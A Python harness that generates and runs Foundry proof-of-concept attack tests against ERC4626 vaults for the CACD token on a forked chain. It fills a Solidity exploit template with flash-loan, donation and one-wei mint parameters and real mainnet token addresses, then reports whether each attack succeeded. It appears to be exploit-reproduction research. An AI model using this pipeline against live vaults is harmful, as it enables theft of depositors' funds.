#!/usr/bin/env python3
"""
CACD Vault 攻击测试脚本

功能：
1. 从 final_report.csv 解析 CACD 案例及"其他block"列
2. 先验证 Vault 在候选区块是否已部署（eth_getCode）
3. 调用 FlashSwap inputData API 获取 swap calldata
4. 生成 Solidity PoC 文件
5. 运行 forge test -vvv

用法：
  python cacd_attack_test.py [--case INDEX] [--block BLOCK] [--skip-api] [--dry-run]
"""

import csv
import json
import os
import re
import shutil
import subprocess
import sys
import urllib.request
import urllib.error
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ============================================================
# 配置
# ============================================================
RPC_URL = "http://127.0.0.1:18545"
INPUTDATA_API = "http://127.0.0.1:3001/inputdata"
NO_PROXY_ENV = "127.0.0.1,localhost"

# 代币地址
USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
CACD_ADDRESS = "0xCAcd6fd266aF91b8AeD52aCCc382b4e165586E29"
REUSD_ADDRESS = "0x57aB1E0003F623289CD798B1824Be09a793e4Bec"

# Minter（部分合约可能需要 addPair）
MINTER_OWNER = "0xc07e000044F95655c11fda4cD37F70A94d7e0a7d"
MINTER_ADDRESS = "0x10101010E0C3171D894B71B3400668aF311e7D94"

# 路径
SCRIPT_DIR = Path(__file__).parent
CSV_PATH = SCRIPT_DIR / "calldata_bridge" / "final_report.csv"
TEMPLATE_PATH = SCRIPT_DIR / "calldata_bridge" / "templates" / "ERC4626AttackTemplate_CACD.sol"
OUTPUT_DIR = SCRIPT_DIR / "DeFiHackLabs" / "src" / "test" / "2026-erc4626" / "generated"
FOUNDRY_DIR = SCRIPT_DIR / "DeFiHackLabs"


def log(msg: str, level: str = "INFO"):
    colors = {"INFO": "", "OK": "\033[92m", "WARN": "\033[93m", "ERR": "\033[91m", "": ""}
    reset = "\033[0m" if level in colors and colors[level] else ""
    prefix = colors.get(level, "")
    print(f"{prefix}[{level}] {msg}{reset}")


def to_checksum_address(addr: str) -> str:
    """EIP-55 checksum（使用正确的 Keccak-256，非 NIST SHA-3）"""
    # 优先使用 eth_utils
    try:
        from eth_utils import to_checksum_address as _eip55
        return _eip55(addr)
    except ImportError:
        pass

    addr = addr.lower().replace("0x", "")
    # 使用 pycryptodome 的 keccak（正确的 Ethereum keccak-256）
    try:
        from Crypto.Hash import keccak as kk
        h = kk.new(digest_bits=256, data=addr.encode())
        hash_hex = h.hexdigest()
    except ImportError:
        # fallback: pysha3
        import sha3
        hash_hex = sha3.keccak_256(addr.encode()).hexdigest()

    checksummed = "0x"
    for i, c in enumerate(addr):
        if c in "0123456789":
            checksummed += c
        elif int(hash_hex[i], 16) >= 8:
            checksummed += c.upper()
        else:
            checksummed += c
    return checksummed


# ============================================================
# CSV 解析
# ============================================================
def parse_csv() -> List[Dict]:
    """解析 final_report.csv，提取 CACD 案例"""
    cases = []
    
    # 这个 CSV 有多行的"其他block"字段，需要特殊处理
    with open(str(CSV_PATH), "r", encoding="utf-8-sig") as f:
        content = f.read()
    
    # 将多行的引号字段合并回单行
    lines = []
    current_line = ""
    in_quotes = False
    for char in content:
        if char == '"':
            in_quotes = not in_quotes
        if char == '\n' and in_quotes:
            current_line += ' '
        elif char == '\n':
            lines.append(current_line)
            current_line = ""
        else:
            current_line += char
    if current_line:
        lines.append(current_line)
    
    if not lines:
        return cases
    
    # 解析 header
    reader = csv.DictReader(lines)
    idx = 0
    for row in reader:
        idx += 1
        asset = row.get("asset_address", "").strip()
        if asset.lower() != CACD_ADDRESS.lower():
            continue
        
        # 解析 "其他block" 列
        other_blocks_str = row.get("其他block", "").strip()
        other_blocks = []
        if other_blocks_str:
            # 去掉方括号和多余空白
            cleaned = other_blocks_str.replace("[", "").replace("]", "")
            for num in cleaned.split(","):
                num = num.strip()
                if num and num.isdigit():
                    other_blocks.append(int(num))
        
        cases.append({
            "index": idx,
            "suspicious_contract": row.get("suspicious_contract", "").strip(),
            "block_number": int(row.get("suspicious block_number", "0").strip()),
            "vault": row.get("erc4612vault", "").strip(),
            "asset_address": asset,
            "other_blocks": sorted(other_blocks),
            "status": row.get("分析状态", "").strip(),
        })
    
    return cases


# ============================================================
# RPC 查询
# ============================================================
def eth_get_code(address: str, block: int) -> str:
    """查询合约 bytecode"""
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_getCode",
        "params": [address, hex(block)],
        "id": 1
    }
    try:
        req = urllib.request.Request(
            RPC_URL,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            result = json.loads(resp.read().decode())
            return result.get("result", "0x")
    except Exception as e:
        log(f"RPC eth_getCode 失败: {e}", "ERR")
        return "0x"


def find_deployed_block(vault_address: str, candidate_blocks: List[int]) -> Optional[int]:
    """在候选区块中找到 Vault 已部署的最早区块"""
    if not candidate_blocks:
        return None
    
    log(f"在 {len(candidate_blocks)} 个候选区块中搜索 Vault {vault_address[:10]}... 的部署区块")
    
    # 先检查最晚的区块（最可能已部署）
    latest = candidate_blocks[-1]
    code = eth_get_code(vault_address, latest)
    if code == "0x" or len(code) <= 2:
        log(f"最晚区块 {latest} 也未部署 Vault!", "WARN")
        return None
    
    log(f"区块 {latest} Vault 已部署 (bytecode {len(code)} bytes)", "OK")
    
    # 从第二个区块开始检查（跳过原始 suspicious block，那个已知未部署）
    # 使用二分搜索找最早部署区块
    first_deployed = latest
    
    # 检查第二个候选区块
    if len(candidate_blocks) > 1:
        second = candidate_blocks[1]  # 跳过 [0] 因为那是原始 suspicious block
        code2 = eth_get_code(vault_address, second)
        if code2 != "0x" and len(code2) > 2:
            first_deployed = second
            log(f"区块 {second} Vault 已部署", "OK")
        else:
            log(f"区块 {second} Vault 未部署，使用最晚区块 {latest}", "INFO")
    
    return first_deployed


# ============================================================
# InputData API 调用
# ============================================================
def get_swap_calldata(token_in: str, token_out: str, amount_wei: str, 
                       block_number: Optional[int] = None) -> Optional[Dict]:
    """调用 FlashSwap inputData API 获取 swap calldata"""
    body = {
        "token_in": token_in,
        "token_out": token_out,
        "amount": amount_wei,
        "max_hops": 3,
        "enable_verification": False,
    }
    if block_number:
        body["block_number"] = block_number
    
    try:
        req = urllib.request.Request(
            INPUTDATA_API,
            data=json.dumps(body).encode(),
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read().decode())
            return result
    except urllib.error.URLError as e:
        log(f"InputData API 调用失败: {e}", "ERR")
        return None
    except Exception as e:
        log(f"InputData API 异常: {e}", "ERR")
        return None


def extract_calldata_info(api_response: Dict) -> Tuple[str, str]:
    """从 API 响应中提取 target 和 calldata"""
    if not api_response:
        return ("address(0)", "")
    
    multicall_to = api_response.get("multicall_to", "")
    multicall_data = api_response.get("multicall_data", "")
    
    if multicall_to and multicall_data:
        return (to_checksum_address(multicall_to), multicall_data)
    
    # fallback: 使用 steps 中的第一个
    steps = api_response.get("steps", [])
    if steps:
        step = steps[0]
        pool_addr = step.get("pool_address", "")
        encoded = step.get("encoded_data", "")
        if pool_addr and encoded:
            return (to_checksum_address(pool_addr), encoded)
    
    return ("address(0)", "")


# ============================================================
# Solidity 文件生成
# ============================================================
def generate_cacd_sol(case: Dict, block: int, 
                      swap_usdc_target: str, swap_usdc_calldata: str,
                      swap_reusd_target: str, swap_reusd_calldata: str,
                      swap_asset_target: str, swap_asset_calldata: str,
                      swap_vault_to_asset_target: str = "") -> Path:
    """生成 CACD 案例的 Solidity 测试文件"""
    suspicious = case["suspicious_contract"]
    contract_name = f"Case_{suspicious.replace('0x', '')[:8].lower()}_{block}"
    
    template = TEMPLATE_PATH.read_text(encoding="utf-8")
    
    # 修正 import 路径（模板在 templates/ 下，生成在 generated/ 下）
    template = template.replace(
        'import "../basetest.sol";',
        'import "../../basetest.sol";'
    )
    
    # vault→asset 路由目标：优先 FlashSwap ERC4626 路由，回退到 address(erc4626vault)
    vault_redeem_target = swap_vault_to_asset_target if swap_vault_to_asset_target else "address(erc4626vault)"
    
    # 替换占位符
    replacements = {
        "{{CONTRACT_NAME}}": contract_name,
        "{{SUSPICIOUS_CONTRACT}}": to_checksum_address(suspicious),
        "{{FORK_BLOCK_NUMBER}}": str(block),
        "{{FLASH_LOAN_AMOUNT}}": "4_000 * 1e6",
        "{{ATTACKER_TRANSFER_AMOUNT}}": "2_000 * 1e18",
        "{{ATTACKER_MINT_AMOUNT}}": "1",
        "{{SWAP_USDC_TO_ASSET_TARGET}}": swap_usdc_target,
        "{{SWAP_USDC_TO_ASSET_CALLDATA}}": swap_usdc_calldata,
        "{{SWAP_VAULT_TO_ASSET_TARGET}}": vault_redeem_target,
        "{{SWAP_ASSET_TO_USDC_TARGET}}": swap_asset_target,
        "{{SWAP_ASSET_TO_USDC_CALLDATA}}": swap_asset_calldata,
        "{{SWAP_REUSD_TO_ASSET_TARGET}}": swap_reusd_target,
        "{{SWAP_REUSD_TO_ASSET_CALLDATA}}": swap_reusd_calldata,
    }
    
    for placeholder, value in replacements.items():
        template = template.replace(placeholder, value)
    
    # 输出文件
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    output_path = OUTPUT_DIR / f"{contract_name}.sol"
    output_path.write_text(template, encoding="utf-8")
    log(f"已生成: {output_path.name}", "OK")
    return output_path


# ============================================================
# Forge 测试运行
# ============================================================
def _find_forge() -> str:
    """查找 forge 可执行文件路径"""
    # 1. PATH 中查找
    found = shutil.which("forge")
    if found:
        return found
    # 2. 默认 foundry 安装路径
    default = Path.home() / ".foundry" / "bin" / "forge.exe"
    if default.exists():
        return str(default)
    return "forge"  # fallback


def run_forge_test(sol_file: Path, timeout: int = 300, verbose: bool = True) -> Tuple[bool, str]:
    """运行 forge test"""
    contract_name = sol_file.stem
    forge_bin = _find_forge()
    
    vvv_flag = "-vvv" if verbose else "-vv"
    cmd = [
        forge_bin, "test",
        "--match-path", str(sol_file.relative_to(FOUNDRY_DIR)).replace("\\", "/"),
        "--match-contract", contract_name,
        vvv_flag,
    ]
    
    log(f"运行: {' '.join(cmd)}")
    
    env = os.environ.copy()
    env["NO_PROXY"] = NO_PROXY_ENV
    env["no_proxy"] = NO_PROXY_ENV
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=str(FOUNDRY_DIR),
            env=env
        )
        output = result.stdout + "\n" + result.stderr
        success = result.returncode == 0 and "PASS" in output
        return success, output
    except subprocess.TimeoutExpired:
        return False, "TIMEOUT"
    except Exception as e:
        return False, str(e)


# ============================================================
# 主流程
# ============================================================
def main():
    import argparse
    parser = argparse.ArgumentParser(description="CACD Vault 攻击测试")
    parser.add_argument("--case", type=int, help="只处理指定 CSV 行号的案例")
    parser.add_argument("--block", type=int, help="指定测试区块（跳过自动查找）")
    parser.add_argument("--skip-api", action="store_true", help="跳过 inputData API，使用占位 calldata")
    parser.add_argument("--dry-run", action="store_true", help="只生成文件，不运行 forge")
    parser.add_argument("--check-deploy", action="store_true", help="只检查 Vault 部署状态")
    args = parser.parse_args()
    
    log("=" * 60)
    log("CACD Vault 攻击测试脚本")
    log("=" * 60)
    
    # 1. 解析 CSV
    cases = parse_csv()
    if not cases:
        log("未找到 CACD 案例!", "ERR")
        return
    
    log(f"找到 {len(cases)} 个 CACD 案例:")
    for c in cases:
        log(f"  [{c['index']}] {c['suspicious_contract'][:18]}... vault={c['vault'][:18]}... "
            f"原始区块={c['block_number']} 候选区块={len(c['other_blocks'])}个")
    
    # 过滤
    if args.case:
        cases = [c for c in cases if c["index"] == args.case]
        if not cases:
            log(f"未找到案例 {args.case}", "ERR")
            return
    
    results = []
    
    for case in cases:
        log(f"\n{'='*60}")
        log(f"处理案例 [{case['index']}]: {case['suspicious_contract']}")
        log(f"Vault: {case['vault']}")
        log(f"原始区块: {case['block_number']}")
        log(f"候选区块数: {len(case['other_blocks'])}")
        
        # 2. 查找 Vault 已部署的区块
        if args.block:
            target_block = args.block
            log(f"使用指定区块: {target_block}")
        else:
            target_block = find_deployed_block(case["vault"], case["other_blocks"])
            if target_block is None:
                log(f"Vault 在所有候选区块均未部署，跳过", "WARN")
                results.append({"case": case, "status": "SKIP", "reason": "Vault未部署"})
                continue
            log(f"使用区块: {target_block}", "OK")
        
        if args.check_deploy:
            code = eth_get_code(case["vault"], target_block)
            log(f"Vault bytecode 长度: {len(code)} bytes")
            results.append({"case": case, "block": target_block, 
                          "status": "DEPLOYED" if len(code) > 2 else "NOT_DEPLOYED"})
            continue
        
        # 3. 获取 swap calldata
        if args.skip_api:
            log("跳过 inputData API，使用占位 calldata", "WARN")
            swap_usdc_target = "address(0)"
            swap_usdc_calldata = "0x00"
            swap_reusd_target = "address(0)"
            swap_reusd_calldata = "0x00"
            swap_asset_target = "address(0)"
            swap_asset_calldata = "0x00"
            swap_vault_to_asset_target = ""
        else:
            # Step 1: USDC → CACD token (4000 USDC = 4000 * 1e6 = 4000000000 wei)
            log("查询 USDC→CACD swap calldata...")
            usdc_to_cacd = get_swap_calldata(
                USDC_ADDRESS, CACD_ADDRESS,
                "4000000000",  # 4000 USDC
                block_number=target_block
            )
            swap_usdc_target, swap_usdc_calldata = extract_calldata_info(usdc_to_cacd)
            if swap_usdc_target == "address(0)":
                log("无法获取 USDC→CACD calldata，API 可能未运行", "WARN")
            else:
                log(f"USDC→CACD target: {swap_usdc_target[:18]}...", "OK")
            
            # Step 3: reUSD → CACD token (动态金额，先用 1e18 估算)
            log("查询 reUSD→CACD swap calldata...")
            reusd_to_cacd = get_swap_calldata(
                REUSD_ADDRESS, CACD_ADDRESS,
                "1000000000000000000",  # 1 reUSD 估算
                block_number=target_block
            )
            swap_reusd_target, swap_reusd_calldata = extract_calldata_info(reusd_to_cacd)
            if swap_reusd_target == "address(0)":
                log("无法获取 reUSD→CACD calldata", "WARN")
            else:
                log(f"reUSD→CACD target: {swap_reusd_target[:18]}...", "OK")
            
            # Step 4a: vault share → asset（FlashSwap ERC4626 路由）
            swap_vault_to_asset_target = ""
            vault_addr = case.get("vault", "")
            if vault_addr:
                log("查询 vault_share→asset FlashSwap ERC4626 路由...")
                vault_to_asset = get_swap_calldata(
                    vault_addr, CACD_ADDRESS,
                    "1",  # 1 vault share
                    block_number=target_block
                )
                if vault_to_asset:
                    vt_target, _ = extract_calldata_info(vault_to_asset)
                    if vt_target != "address(0)":
                        swap_vault_to_asset_target = vt_target
                        log(f"vault→asset FlashSwap 路由目标: {vt_target[:18]}...", "OK")
                    else:
                        log("FlashSwap 未找到 vault ERC4626 路由，回退到直接 redeem", "INFO")
                else:
                    log("vault→asset 查询失败，回退到直接 redeem", "INFO")
            
            # Step 4b: CACD → USDC (动态金额，先用 2000e18 估算)
            log("查询 CACD→USDC swap calldata...")
            cacd_to_usdc = get_swap_calldata(
                CACD_ADDRESS, USDC_ADDRESS,
                "2000000000000000000000",  # 2000 CACD 估算
                block_number=target_block
            )
            swap_asset_target, swap_asset_calldata = extract_calldata_info(cacd_to_usdc)
            if swap_asset_target == "address(0)":
                log("无法获取 CACD→USDC calldata", "WARN")
            else:
                log(f"CACD→USDC target: {swap_asset_target[:18]}...", "OK")
        
        # 4. 生成 Solidity 文件
        sol_file = generate_cacd_sol(
            case, target_block,
            swap_usdc_target, swap_usdc_calldata,
            swap_reusd_target, swap_reusd_calldata,
            swap_asset_target, swap_asset_calldata,
            swap_vault_to_asset_target=swap_vault_to_asset_target
        )
        
        if args.dry_run:
            log("Dry-run 模式，跳过 forge test", "INFO")
            results.append({"case": case, "block": target_block, "status": "GENERATED", 
                          "sol_file": str(sol_file)})
            continue
        
        # 5. 运行 forge test -vvv
        log(f"\n运行 forge test -vvv ...")
        success, output = run_forge_test(sol_file, verbose=True)
        
        # 保存输出
        output_file = SCRIPT_DIR / f"cacd_test_{case['suspicious_contract'][:10]}_{target_block}.txt"
        output_file.write_text(output, encoding="utf-8")
        log(f"测试输出保存至: {output_file.name}")
        
        if success:
            log(f"✅ 案例 [{case['index']}] 攻击成功!", "OK")
            results.append({"case": case, "block": target_block, "status": "PASS",
                          "output_file": str(output_file)})
        else:
            # 提取错误信息
            error_lines = [l for l in output.split("\n") if "revert" in l.lower() or "error" in l.lower() or "fail" in l.lower()]
            error_summary = "; ".join(error_lines[:5]) if error_lines else "未知错误"
            log(f"❌ 案例 [{case['index']}] 攻击失败: {error_summary[:200]}", "ERR")
            results.append({"case": case, "block": target_block, "status": "FAIL",
                          "error": error_summary[:500], "output_file": str(output_file)})
    
    # 打印汇总
    log(f"\n{'='*60}")
    log("测试汇总:")
    log(f"{'='*60}")
    for r in results:
        c = r["case"]
        status = r["status"]
        block = r.get("block", "N/A")
        log(f"  [{c['index']}] {c['suspicious_contract'][:18]}... @ {block} => {status}")
        if status == "FAIL" and "error" in r:
            log(f"       错误: {r['error'][:150]}")


if __name__ == "__main__":
    main()
